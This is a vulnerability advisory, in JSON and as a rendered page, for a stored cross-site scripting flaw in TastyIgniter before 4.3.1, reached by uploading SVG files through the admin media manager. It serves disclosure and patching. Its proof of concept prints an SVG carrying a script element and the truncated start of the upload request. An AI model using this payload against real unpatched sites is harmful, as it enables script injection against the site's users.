---
{
  "uuid": "aebadac4-d459-4ede-bcd5-dc80da202327",
  "ids": [
    "CVE-2026-69177",
    "GHSA-mqg7-fw3f-mhp7"
  ],
  "title": "TastyIgniter allows stored XSS via file upload",
  "summary": "### Summary Stored XSS via uploading SVG files ### Details It is possible to upload SVG files that contains XSS. ### PoC - login as admin - create the following SVG file ``` <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"400\" height=\"400\" viewBox=\"0 0 124 124\" fill=\"none\"> <rect width=\"124\" height=\"124\" rx=\"24\" fill=\"#000000\"/> <script type=\"text/javascript\"> alert(1); </script> </svg> ``` - upload the SVG file in media manager ``` POST /admin/media_manager HTTP/1.1 Host: localhost:8888 Content-Length: 514 sec-ch-ua-platform: \"Linux\" X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx Cache",
  "translation": "none",
  "severity": "medium",
  "cvssScore": 6.8,
  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:H",
  "os": [],
  "languages": [
    "PHP"
  ],
  "products": [],
  "packages": [
    {
      "ecosystem": "Packagist",
      "name": "tastyigniter/tastyigniter",
      "vulnerableRange": "< 4.3.1",
      "fixedVersion": "4.3.1"
    }
  ],
  "sources": [
    "ghsa"
  ],
  "links": [
    {
      "kind": "vendor",
      "url": "https://github.com/tastyigniter/TastyIgniter/security/advisories/GHSA-mqg7-fw3f-mhp7",
      "host": "github.com",
      "label": "ベンダー発表 (github.com)"
    },
    {
      "kind": "detail",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-69177",
      "host": "nvd.nist.gov",
      "label": "NVD CVE-2026-69177"
    },
    {
      "kind": "detail",
      "url": "https://github.com/advisories/GHSA-mqg7-fw3f-mhp7",
      "host": "github.com",
      "label": "GitHub Advisory GHSA-mqg7-fw3f-mhp7"
    },
    {
      "kind": "patch",
      "url": "https://github.com/tastyigniter/core/commit/c6f99d7f47d20c144721c7a1044213f52c9b570f",
      "host": "github.com",
      "label": "修正 (github.com)"
    },
    {
      "kind": "reference",
      "url": "https://github.com/tastyigniter/core/releases/tag/v4.3.1",
      "host": "github.com",
      "label": "github.com"
    }
  ],
  "publishedAt": "2026-11-25T21:52:15Z",
  "updatedAt": "2026-11-25T21:52:16Z",
  "firstSeenAt": "2026-11-26T04:41:30.937Z",
  "week": "2026-W48"
}
---

# TastyIgniter allows stored XSS via file upload

- **ID**: CVE\-2026\-69177 / GHSA\-mqg7\-fw3f\-mhp7
- **危険度**: Medium（警告） (CVSS 6.8)
- **言語**: PHP
- **パッケージ**: Packagist/tastyigniter/tastyigniter &lt; 4\.3\.1 → 4\.3\.1
- **公開**: 2026-11-25

## 原文

\#\#\# Summary Stored XSS via uploading SVG files \#\#\# Details It is possible to upload SVG files that contains XSS\. \#\#\# PoC \- login as admin \- create the following SVG file \`\`\` &lt;svg xmlns\="http\://www\.w3\.org/2000/svg" width\="400" height\="400" viewBox\="0 0 124 124" fill\="none"&gt; &lt;rect width\="124" height\="124" rx\="24" fill\="\#000000"/&gt; &lt;script type\="text/javascript"&gt; alert\(1\); &lt;/script&gt; &lt;/svg&gt; \`\`\` \- upload the SVG file in media manager \`\`\` POST /admin/media\_manager HTTP/1\.1 Host\: localhost\:8888 Content\-Length\: 514 sec\-ch\-ua\-platform\: "Linux" X\-CSRF\-TOKEN\: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx Cache

## リンク

- [ベンダー発表 \(github\.com\)](<https://github.com/tastyigniter/TastyIgniter/security/advisories/GHSA-mqg7-fw3f-mhp7>)
- [NVD CVE\-2026\-69177](<https://nvd.nist.gov/vuln/detail/CVE-2026-69177>)
- [GitHub Advisory GHSA\-mqg7\-fw3f\-mhp7](<https://github.com/advisories/GHSA-mqg7-fw3f-mhp7>)
- [修正 \(github\.com\)](<https://github.com/tastyigniter/core/commit/c6f99d7f47d20c144721c7a1044213f52c9b570f>)
- [github\.com](<https://github.com/tastyigniter/core/releases/tag/v4.3.1>)
